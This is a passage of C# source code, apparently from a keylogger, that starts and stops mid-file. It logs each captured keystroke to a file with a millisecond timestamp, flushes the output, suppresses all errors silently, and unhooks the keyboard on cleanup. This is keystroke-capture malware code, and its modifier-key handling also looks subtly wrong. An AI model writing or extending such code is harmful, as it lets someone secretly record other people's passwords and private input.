                keyChar = ' ';
            else if (key >= KeyStates.KEYBOARD_FIRST && key <= KeyStates.KEYBOARD_LAST)
                keyChar = (char)key;

            if (isKeyDown && (key == KeyStates.VK_SHIFT || key == KeyStates.VK_CONTROL || key == KeyStates.VK_MENU))
            {
                // Handle shifted or modified keystrokes
                keyChar = char.ToUpper(keyChar);
            }

            writer.WriteLine($"{DateTime.Now:HH:mm:ss.fff} - {keyChar}");
            writer.Flush();
        }
        catch (Exception)
        {
            // Handle exceptions silently
        }
    }

    public static void Cleanup()
    {
        try
        {
            if (hook != null && isHooked)
            {
                UnhookKeyboard(hook);
                isHooked = false;
            }
        }
        catch (Exception)
